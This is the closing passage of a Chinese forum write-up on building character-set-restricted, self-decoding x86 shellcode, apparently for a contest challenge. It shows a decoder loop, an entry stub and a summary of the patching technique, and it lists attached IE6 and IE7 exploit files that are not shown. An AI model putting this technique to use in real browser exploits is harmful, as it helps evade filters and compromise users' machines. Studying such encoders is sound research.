
# 解码循环

```
0013FC57 58 pop eax
0013FC58 24 70 and al,70h
0013FC5A 3C 70 cmp al,70h ;首字节高 4 位为 7 时结束
0013FC5C 75 ED jne 0013FC4B ;解码循环判定
0013FC5E 5A pop edx
0013FC5F 58 pop eax ; 恢复解码数据的地址
```

下面是我写的一个附加的，有点多余的东西，优化可以去除不少，但也有些地方要注意修正。

```
0013FC60 5A pop edx
0013FC61 5A pop edx
0013FC62 5A pop edx
0013FC63 68 58 50 C3 41 push 41C35058h
0013FC68 50 push eax
0013FC69 68 41 41 41 68 push 68414141h
0013FC6E FF E0 jmp eax
```

## 入口指令

在入口处写入类似下面的指令

```
INC ECX
INC ECX
INC ECX
PUSH 0xxxxxxxxH ; 这个值为通用 shellcode 的入口地址
RET
INC ECX
```

之后，再跳转到入口地址执行。

目前母板的解码偏移量为 `0` 时，也就说这是入口地址。首尾亦相连，起始亦是终。执行后的效果，也就出来了。执行不完的返回操作，就像转圈咬自已的耳朵一样。

# 四小结

1 在第一次向后跳转之前就已经修正它的偏移量。
2 利用内存储器（主要是栈操作）作为操作数参与算术和逻辑运算，以达到字符集以外的指令所能达到的功能。
3 修正完成之后可以使用任意指令，不再受字符集的限制，但受修正地址偏移量的限制（具体的范围参见前面的 `addr`）和修正数量的限制，但完成一个简单的组装 `Shellcode` 的功能还有够用了。

至此，我们已经完全走过了一遍。最后附上我在 B 题中使用这种方法提交的代码。所加载的 `shellcode` 是弹出对话框的 `168byte`，将提示信息改了一下。注：`IE6` 和 `IE7` 是有些差异的，分成了两个文件。

全文完。

附件中 VC 项目

attachments NFO2PIC END NFO2PIC

上传的附件

| ![文件类型: rar](img/c5cab6e3170a99007dd39ef0ef19018e.jpg) | VBZH - PHPForce - Joey 修改附件隐藏 | Test.rar (2008-01-02 22:00, 34.9 KB) | /VBZH - PHPForce - Joey 修改附件隐藏 |
| --- | --- | --- | --- |
| ![文件类型: txt](img/7f0c5dd3447a0dfda1f1eef4df9f54c9.jpg) | VBZH - PHPForce - Joey 修改附件隐藏 | exploit\_IE7.txt (2008-01-07 20:07, 916 字节) | /VBZH - PHPForce - Joey 修改附件隐藏 |
| ![文件类型: txt](img/7f0c5dd3447a0dfda1f1eef4df9f54c9.jpg) | VBZH - PHPForce - Joey 修改附件隐藏 | exploit\_IE6.txt (2008-01-07 20:07, 953 字节) | /VBZH - PHPForce - Joey 修改附件隐藏 |

`4dd466d0e1e0cc123afbe504da2462ca`
